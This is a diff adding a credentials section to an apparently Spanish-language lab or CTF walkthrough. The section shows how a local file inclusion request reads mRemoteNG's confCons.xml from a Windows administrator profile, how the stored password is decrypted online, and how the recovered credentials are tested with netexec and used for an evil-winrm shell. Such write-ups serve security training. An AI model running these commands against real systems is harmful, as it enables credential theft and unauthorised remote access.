@@ -99,5 +99,48 @@ curl -sX POST "http://192.168.1.45/page.php?section=C:\Users\Administrator\AppDa
 -Restart-Computer -Force --> reinicia el equipo de forma forzada
 
 
+##CREDENCIALES
+
+
+Hago una consulta a San Google y pregunto la ruta dónde guarda credenciales por defecto :
+
+![Connection](images/Connection/10.png)
+
+
+veamos si tenemos lectura del archivo:
+
+```bash
+curl -sX POST "http://192.168.1.45/page.php?section=c:\users\administrator\appdata\roaming\mremoteng\confcons.xml"
+```
+
+Para que veais que esto me dió un quebradero de cabeza:
+
+![Connection](images/Connection/11.png)
+
+
+Vemos por ahí Name="administrator" y Password="RUQ0nzfeIV11g9eDodO74bdInTIu3LE0OAn3P+tWkNKEoAJWViqGx1us4kMsy4JmmY37UlrxPREoaYlTT+JY4YCnTlogYypQ"  pero esta encodeado, buscando por intyernet encuentro esta página:
+```
+https://keydecryptor.com/decryption-tools/mremoteng
+```
+
+![Connection](images/Connection/11.png)
+
+
+y tenemos un password--->TheConnectionPassword123
+
+nos volvemos al 445 a probar si las credenciales son validas:
+
+![Connection](images/Connection/12-2.png)
+
+
+```bash
+netexec smb 192.168.1.45 -u 'administrator' -p 'TheConnectionPassword123'
+evil-winrm -i 192.168.1.45 -u 'administrator' -p 'TheConnectionPassword123'
+```
+
+y hasta aquí esta máquina que me ha encantado ;)
+
+
+
 
 
